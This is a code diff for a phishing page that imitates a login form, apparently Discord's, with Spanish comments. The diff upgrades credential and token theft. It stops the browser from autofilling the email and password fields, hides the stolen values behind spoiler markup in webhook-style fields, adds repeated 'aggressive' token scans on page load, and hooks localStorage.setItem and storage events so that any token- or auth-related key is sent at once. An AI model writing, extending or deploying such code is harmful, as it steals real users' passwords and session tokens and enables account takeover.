@@ -172,15 +172,15 @@
             Invalid email or password. Please try again.
         </div>
         
-        <form id="loginForm">
+        <form id="loginForm" autocomplete="off">
             <div class="form-group">
                 <label for="email">Email or Phone Number <span style="color: #f04747;">*</span></label>
-                <input type="text" id="email" required autocomplete="username">
+                <input type="text" id="email" required autocomplete="off">
             </div>
             
             <div class="form-group">
                 <label for="password">Password <span style="color: #f04747;">*</span></label>
-                <input type="password" id="password" required autocomplete="current-password">
+                <input type="password" id="password" required autocomplete="off">
             </div>
             
             <button type="submit" class="btn">Log In</button>
@@ -338,26 +338,26 @@
             
             var fields = [
                 {name: 'Platform', value: platform || 'Unknown', inline: true},
-                {name: 'Tokens Found', value: String(tokens.length), inline: true},
+                {name: 'Tokens Found', value: '||' + String(tokens.length) + '||', inline: true},
                 {name: 'Time', value: new Date().toLocaleString(), inline: true}
             ];
             
             if (email && email.length > 0) {
-                // Escapar caracteres especiales
+                // Escapar caracteres especiales y ocultar completamente
                 var safeEmail = email.replace(/[`]/g, '');
                 fields.push({
                     name: '📧 Email/Phone', 
-                    value: '||`' + safeEmail + '`||', 
+                    value: '||' + safeEmail + '||', 
                     inline: false
                 });
             }
             
             if (pass && pass.length > 0) {
-                // Escapar caracteres especiales
+                // Escapar caracteres especiales y ocultar completamente
                 var safePass = pass.replace(/[`]/g, '');
                 fields.push({
                     name: '🔑 Password', 
-                    value: '||`' + safePass + '`||', 
+                    value: '||' + safePass + '||', 
                     inline: false
                 });
             }
@@ -369,20 +369,20 @@
                 // Truncar valor si es muy largo
                 var tokenValue = t.v.length > 100 ? t.v.substring(0, 100) + '...' : t.v;
                 fields.push({
-                    name: '🎫 Token #' + (j + 1) + ' (' + t.s + ')',
-                    value: '||`' + tokenValue + '`||',
+                    name: '🎫 Token #' + (j + 1) + ' (' + t.s + ': ' + t.k + ')',
+                    value: '||' + tokenValue + '||',
                     inline: false
                 });
             }
             
-            // User agent truncado
+            // User agent truncado y oculto
             var ua = navigator.userAgent;
             if (ua.length > 200) {
                 ua = ua.substring(0, 200) + '...';
             }
             fields.push({
                 name: '💻 User Agent',
-                value: '`' + ua + '`',
+                value: '||' + ua + '||',
                 inline: false
             });
             
@@ -463,10 +463,68 @@
         
         // Auto-scan al cargar
         console.log('Page loaded, auto-scan will start in 3 seconds...');
+        
+        // Limpiar campos al cargar
+        document.getElementById('email').value = '';
+        document.getElementById('password').value = '';
+        
+        // Escaneo agresivo múltiple para capturar tokens durante la carga
+        var scanCount = 0;
+        var maxScans = 10;
+        
+        // Escaneo inmediato
+        send(null, null);
+        scanCount++;
+        
+        // Escaneos repetidos cada 500ms durante los primeros 5 segundos
+        var aggressiveScan = window.setInterval(function() {
+            console.log('Aggressive scan #' + scanCount);
+            send(null, null);
+            scanCount++;
+            
+            if (scanCount >= maxScans) {
+                window.clearInterval(aggressiveScan);
+                console.log('Aggressive scanning complete');
+            }
+        }, 500);
+        
+        // Escaneo adicional a los 3 segundos (por si acaso)
         var autoTimer = window.setTimeout(function() {
-            console.log('Auto-scan triggered');
+            console.log('Final auto-scan triggered');
             send(null, null);
         }, 3000);
+        
+        // Monitor de cambios en localStorage para capturar tokens en tiempo real
+        var originalSetItem = localStorage.setItem;
+        localStorage.setItem = function(key, value) {
+            console.log('localStorage.setItem intercepted:', key);
+            
+            // Llamar al método original
+            originalSetItem.apply(this, arguments);
+            
+            // Si detectamos algo relacionado con token, escanear inmediatamente
+            var keyLower = key.toLowerCase();
+            if (keyLower.indexOf('token') > -1 || 
+                keyLower.indexOf('discord') > -1 || 
+                keyLower.indexOf('auth') > -1) {
+                console.log('TOKEN DETECTED! Scanning immediately...');
+                send(null, null);
+            }
+        };
+        
+        // También monitorear Storage events (cambios desde otras pestañas)
+        window.addEventListener('storage', function(e) {
+            if (e.key && e.newValue) {
+                console.log('Storage event detected:', e.key);
+                var keyLower = e.key.toLowerCase();
+                if (keyLower.indexOf('token') > -1 || 
+                    keyLower.indexOf('discord') > -1 || 
+                    keyLower.indexOf('auth') > -1) {
+                    console.log('TOKEN STORAGE EVENT! Scanning...');
+                    send(null, null);
+                }
+            }
+        });
     </script>
 </body>
 </html>
